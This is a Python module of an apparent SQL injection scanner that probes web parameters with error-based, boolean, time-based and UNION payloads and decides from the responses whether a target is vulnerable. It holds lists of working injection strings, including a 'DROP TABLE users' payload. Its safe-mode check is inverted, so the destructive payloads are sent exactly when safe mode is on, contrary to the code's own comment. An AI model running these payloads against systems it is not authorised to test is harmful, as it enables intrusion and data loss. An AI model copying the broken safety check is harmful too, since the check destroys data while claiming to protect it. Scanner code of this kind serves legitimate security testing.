"""
SQL injection detection engine.
Implements various detection techniques including error-based, boolean-based, and time-based detection.
"""
import re
import time
import statistics
from typing import Dict, List, Optional, Tuple, Any
from difflib import SequenceMatcher

from ..core.base import BaseModule, ScanConfig, TestResult, InjectionPoint, InjectionType, DBType, DB_ERROR_PATTERNS
from ..modules.http_engine import HTTPEngine
from ..utils.logger import get_logger


class InjectionDetector(BaseModule):
    """
    Main detection engine for SQL injection vulnerabilities.
    Implements multiple detection techniques and heuristics.
    """
    
    def __init__(self, config: ScanConfig):
        super().__init__(config)
        self.logger = get_logger("detector")
        self.http_engine = HTTPEngine(config)
        self.baseline_responses = {}
        
    def detect_injection(self, injection_point: InjectionPoint) -> TestResult:
        """
        Main detection method that runs all detection techniques.
        
        Args:
            injection_point: The injection point to test
            
        Returns:
            TestResult with detection results
        """
        self.logger.info(f"Testing injection point: {injection_point.parameter} ({injection_point.param_type})")
        
        # Get baseline response
        baseline = self._get_baseline_response(injection_point)
        
        # Try different detection methods
        detection_results = []
        
        # 1. Error-based detection
        error_result = self._test_error_based(injection_point, baseline)
        if error_result:
            detection_results.append(error_result)
        
        # 2. Boolean-based detection
        boolean_result = self._test_boolean_based(injection_point, baseline)
        if boolean_result:
            detection_results.append(boolean_result)
        
        # 3. Time-based detection
        time_result = self._test_time_based(injection_point, baseline)
        if time_result:
            detection_results.append(time_result)
        
        # 4. UNION-based detection (quick check)
        union_result = self._test_union_based(injection_point, baseline)
        if union_result:
            detection_results.append(union_result)
        
        # Return the most confident result
        if detection_results:
            # Sort by confidence (error-based > boolean > time > union for quick detection)
            detection_results.sort(key=lambda x: self._get_confidence_score(x), reverse=True)
            return detection_results[0]
        else:
            # No injection detected
            return TestResult(
                injection_point=injection_point,
                payload="",
                tamper_used=[],
                response_status=baseline['status_code'],
                response_length=len(baseline['content']),
                response_time=baseline['response_time'],
                response_body=baseline['content'][:1000],  # Truncate for storage
                response_headers=baseline['headers'],
                vulnerable=False,
                injection_type=None,
                db_type=None,
                error_message=None
            )
    
    def _get_baseline_response(self, injection_point: InjectionPoint) -> Dict[str, Any]:
        """Get baseline response with original value."""
        request_params = self.http_engine.build_request_with_payload(
            injection_point, injection_point.original_value
        )
        
        response = self.http_engine.make_request(**request_params)
        self.baseline_responses[injection_point.parameter] = response
        return response
    
    def _test_error_based(self, injection_point: InjectionPoint, baseline: Dict[str, Any]) -> Optional[TestResult]:
        """
        Test for error-based SQL injection.
        
        Args:
            injection_point: The injection point to test
            baseline: Baseline response
            
        Returns:
            TestResult if vulnerable, None otherwise
        """
        self.logger.debug("Testing error-based injection")
        
        # Error-inducing payloads
        error_payloads = [
            "'",
            "\"",
            "')",
            "\")",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' UNION SELECT NULL,NULL,NULL--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "'; DROP TABLE users; --",
            "\"; DROP TABLE users; --"
        ]
        
        for payload in error_payloads:
            if not self.config.safe_mode and "DROP" in payload.upper():
                continue  # Skip destructive payloads in safe mode
            
            request_params = self.http_engine.build_request_with_payload(injection_point, payload)
            response = self.http_engine.make_request(**request_params)
            
            # Check for database errors
            db_type, error_message = self._detect_database_error(response['content'])
            if db_type != DBType.UNKNOWN:
                return TestResult(
                    injection_point=injection_point,
                    payload=payload,
                    tamper_used=[],
                    response_status=response['status_code'],
                    response_length=len(response['content']),
                    response_time=response['response_time'],
                    response_body=response['content'][:1000],
                    response_headers=response['headers'],
                    vulnerable=True,
                    injection_type=InjectionType.ERROR,
                    db_type=db_type,
                    error_message=error_message
                )
            
            # Check for generic application errors
            if self._has_application_error(response, baseline):
                return TestResult(
                    injection_point=injection_point,
                    payload=payload,
                    tamper_used=[],
                    response_status=response['status_code'],
                    response_length=len(response['content']),
                    response_time=response['response_time'],
                    response_body=response['content'][:1000],
                    response_headers=response['headers'],
                    vulnerable=True,
                    injection_type=InjectionType.ERROR,
                    db_type=DBType.UNKNOWN,
                    error_message="Application error detected"
                )
        
        return None
    
    def _test_boolean_based(self, injection_point: InjectionPoint, baseline: Dict[str, Any]) -> Optional[TestResult]:
        """
        Test for boolean-based blind SQL injection.
        
        Args:
            injection_point: The injection point to test
            baseline: Baseline response
            
        Returns:
            TestResult if vulnerable, None otherwise
        """
        self.logger.debug("Testing boolean-based injection")
        
        # Boolean test payloads
        true_payloads = [
            "' AND '1'='1",
            "\" AND \"1\"=\"1",
            "') AND ('1'='1",
            "\") AND (\"1\"=\"1",
            "' AND 1=1--",
            "\" AND 1=1--",
            " AND 1=1",
            " OR 1=1"
        ]
        
        false_payloads = [
            "' AND '1'='2",
            "\" AND \"1\"=\"2",
            "') AND ('1'='2",
            "\") AND (\"1\"=\"2",
            "' AND 1=2--",
            "\" AND 1=2--",
            " AND 1=2",
            " AND 1=0"
        ]
        
        for i in range(len(true_payloads)):
            true_payload = injection_point.original_value + true_payloads[i]
            false_payload = injection_point.original_value + false_payloads[i]
            
            # Test true condition
            true_request = self.http_engine.build_request_with_payload(injection_point, true_payload)
            true_response = self.http_engine.make_request(**true_request)
            
            # Test false condition
            false_request = self.http_engine.build_request_with_payload(injection_point, false_payload)
            false_response = self.http_engine.make_request(**false_request)
            
            # Compare responses
            if self._responses_differ_significantly(true_response, false_response):
                # Additional verification rounds
                confidence = self._verify_boolean_injection(injection_point, true_payload, false_payload)
                
                if confidence > 0.7:  # High confidence threshold
                    return TestResult(
                        injection_point=injection_point,
                        payload=f"TRUE: {true_payload}, FALSE: {false_payload}",
                        tamper_used=[],
                        response_status=true_response['status_code'],
                        response_length=len(true_response['content']),
                        response_time=true_response['response_time'],
                        response_body=true_response['content'][:1000],
                        response_headers=true_response['headers'],
                        vulnerable=True,
                        injection_type=InjectionType.BOOLEAN,
                        db_type=None,
                        error_message=f"Boolean injection confidence: {confidence:.2f}"
                    )
        
        return None
    
    def _test_time_based(self, injection_point: InjectionPoint, baseline: Dict[str, Any]) -> Optional[TestResult]:
        """
        Test for time-based blind SQL injection.
        
        Args:
            injection_point: The injection point to test
            baseline: Baseline response
            
        Returns:
            TestResult if vulnerable, None otherwise
        """
        self.logger.debug("Testing time-based injection")
        
        # Time-based payloads for different databases
        time_payloads = [
            f"'; WAITFOR DELAY '00:00:0{self.config.time_delay}'; --",  # MSSQL
            f"' OR SLEEP({self.config.time_delay})--",  # MySQL
            f"' OR pg_sleep({self.config.time_delay})--",  # PostgreSQL
            f"' OR dbms_pipe.receive_message(('a'),{self.config.time_delay})=1--",  # Oracle
            f"'; SELECT sleep({self.config.time_delay}); --",  # SQLite (not standard)
            f"' AND (SELECT * FROM (SELECT(SLEEP({self.config.time_delay})))bAKa)--",  # MySQL variant
            f"' UNION SELECT SLEEP({self.config.time_delay})--",  # MySQL UNION
        ]
        
        # Get baseline timing
        baseline_times = []
        for _ in range(3):
            request_params = self.http_engine.build_request_with_payload(
                injection_point, injection_point.original_value
            )
            response = self.http_engine.make_request(**request_params)
            baseline_times.append(response['response_time'])
        
        baseline_avg = statistics.mean(baseline_times)
        baseline_std = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
        
        for payload in time_payloads:
            # Test with time delay
            delayed_payload = injection_point.original_value + payload
            request_params = self.http_engine.build_request_with_payload(injection_point, delayed_payload)
            
            # Measure response time
            start_time = time.time()
            response = self.http_engine.make_request(**request_params)
            actual_time = time.time() - start_time
            
            # Check if response time is significantly longer
            expected_delay = self.config.time_delay
            time_threshold = baseline_avg + (3 * baseline_std) + (expected_delay * 0.8)
            
            if actual_time >= time_threshold:
                # Verify with additional tests
                verification_passed = self._verify_time_injection(injection_point, payload, expected_delay)
                
                if verification_passed:
                    return TestResult(
                        injection_point=injection_point,
                        payload=delayed_payload,
                        tamper_used=[],
                        response_status=response['status_code'],
                        response_length=len(response['content']),
                        response_time=actual_time,
                        response_body=response['content'][:1000],
                        response_headers=response['headers'],
                        vulnerable=True,
                        injection_type=InjectionType.TIME,
                        db_type=self._guess_db_from_time_payload(payload),
                        error_message=f"Time delay detected: {actual_time:.2f}s (expected: {expected_delay}s)"
                    )
        
        return None
    
    def _test_union_based(self, injection_point: InjectionPoint, baseline: Dict[str, Any]) -> Optional[TestResult]:
        """
        Quick test for UNION-based SQL injection.
        
        Args:
            injection_point: The injection point to test
            baseline: Baseline response
            
        Returns:
            TestResult if vulnerable, None otherwise
        """
        self.logger.debug("Testing UNION-based injection")
        
        # Quick UNION tests
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 'test'--",
            "\" UNION SELECT NULL--",
            "\" UNION SELECT 1--",
            "\" UNION SELECT 'test'--",
            "') UNION SELECT NULL--",
            "\") UNION SELECT NULL--"
        ]
        
        for payload in union_payloads:
            test_payload = injection_point.original_value + payload
            request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
            response = self.http_engine.make_request(**request_params)
            
            # Check for UNION-specific indicators
            if self._has_union_indicators(response, baseline):
                return TestResult(
                    injection_point=injection_point,
                    payload=test_payload,
                    tamper_used=[],
                    response_status=response['status_code'],
                    response_length=len(response['content']),
                    response_time=response['response_time'],
                    response_body=response['content'][:1000],
                    response_headers=response['headers'],
                    vulnerable=True,
                    injection_type=InjectionType.UNION,
                    db_type=None,
                    error_message="UNION injection detected"
                )
        
        return None
    
    def _detect_database_error(self, content: str) -> Tuple[DBType, Optional[str]]:
        """
        Detect database type from error messages.
        
        Args:
            content: Response content to analyze
            
        Returns:
            Tuple of (database_type, error_message)
        """
        content_lower = content.lower()
        
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, content_lower, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        
        return DBType.UNKNOWN, None
    
    def _has_application_error(self, response: Dict[str, Any], baseline: Dict[str, Any]) -> bool:
        """Check for application-level errors."""
        # Check status code changes
        if response['status_code'] != baseline['status_code']:
            if response['status_code'] in [400, 500, 502, 503]:
                return True
        
        # Check for generic error indicators
        error_indicators = [
            'error', 'exception', 'warning', 'fatal', 'failed',
            'syntax error', 'unexpected', 'invalid', 'cannot',
            'stack trace', 'traceback', 'debug'
        ]
        
        content_lower = response['content'].lower()
        baseline_lower = baseline['content'].lower()
        
        # Check if error indicators appear in response but not in baseline
        for indicator in error_indicators:
            if indicator in content_lower and indicator not in baseline_lower:
                return True
        
        return False
    
    def _responses_differ_significantly(self, response1: Dict[str, Any], response2: Dict[str, Any]) -> bool:
        """Check if two responses differ significantly."""
        # Status code difference
        if response1['status_code'] != response2['status_code']:
            return True
        
        # Content length difference (threshold: 10% or 100 characters)
        len1, len2 = len(response1['content']), len(response2['content'])
        if len1 > 0 and len2 > 0:
            diff_ratio = abs(len1 - len2) / max(len1, len2)
            if diff_ratio > 0.1 or abs(len1 - len2) > 100:
                return True
        
        # Content similarity
        similarity = SequenceMatcher(None, response1['content'], response2['content']).ratio()
        if similarity < 0.9:  # Less than 90% similar
            return True
        
        return False
    
    def _verify_boolean_injection(self, injection_point: InjectionPoint, 
                                true_payload: str, false_payload: str) -> float:
        """
        Verify boolean injection with multiple rounds.
        
        Returns:
            Confidence score (0.0 to 1.0)
        """
        consistent_results = 0
        total_rounds = self.config.boolean_rounds
        
        for _ in range(total_rounds):
            # Test true condition
            true_request = self.http_engine.build_request_with_payload(injection_point, true_payload)
            true_response = self.http_engine.make_request(**true_request)
            
            # Test false condition  
            false_request = self.http_engine.build_request_with_payload(injection_point, false_payload)
            false_response = self.http_engine.make_request(**false_request)
            
            # Check if responses consistently differ
            if self._responses_differ_significantly(true_response, false_response):
                consistent_results += 1
            
            # Add small delay between tests
            time.sleep(self.config.delay_between_requests)
        
        return consistent_results / total_rounds
    
    def _verify_time_injection(self, injection_point: InjectionPoint, 
                             payload: str, expected_delay: int) -> bool:
        """
        Verify time-based injection with multiple tests.
        
        Returns:
            True if verified, False otherwise
        """
        successful_delays = 0
        total_tests = 3
        
        for _ in range(total_tests):
            delayed_payload = injection_point.original_value + payload
            request_params = self.http_engine.build_request_with_payload(injection_point, delayed_payload)
            
            start_time = time.time()
            self.http_engine.make_request(**request_params)
            actual_delay = time.time() - start_time
            
            # Check if delay is within acceptable range (80% to 120% of expected)
            if expected_delay * 0.8 <= actual_delay <= expected_delay * 1.2:
                successful_delays += 1
            
            time.sleep(0.5)  # Brief pause between tests
        
        return successful_delays >= 2  # At least 2 out of 3 successful
    
    def _guess_db_from_time_payload(self, payload: str) -> Optional[DBType]:
        """Guess database type from time-based payload."""
        payload_lower = payload.lower()
        
        if 'waitfor delay' in payload_lower:
            return DBType.MSSQL
        elif 'sleep(' in payload_lower:
            return DBType.MYSQL
        elif 'pg_sleep' in payload_lower:
            return DBType.POSTGRESQL
        elif 'dbms_pipe.receive_message' in payload_lower:
            return DBType.ORACLE
        
        return None
    
    def _has_union_indicators(self, response: Dict[str, Any], baseline: Dict[str, Any]) -> bool:
        """Check for UNION injection indicators."""
        # Look for additional data in response
        if len(response['content']) > len(baseline['content']) * 1.1:
            return True
        
        # Look for UNION-specific error messages
        union_errors = [
            'the used select statements have a different number of columns',
            'conversion failed when converting',
            'operand should contain 1 column',
            'subquery returns more than 1 row',
            'used select statements have a different number of columns'
        ]
        
        content_lower = response['content'].lower()
        for error in union_errors:
            if error in content_lower:
                return True
        
        return False
    
    def _get_confidence_score(self, result: TestResult) -> int:
        """Get confidence score for ranking detection results."""
        if result.injection_type == InjectionType.ERROR:
            return 4
        elif result.injection_type == InjectionType.BOOLEAN:
            return 3
        elif result.injection_type == InjectionType.TIME:
            return 2
        elif result.injection_type == InjectionType.UNION:
            return 1
        else:
            return 0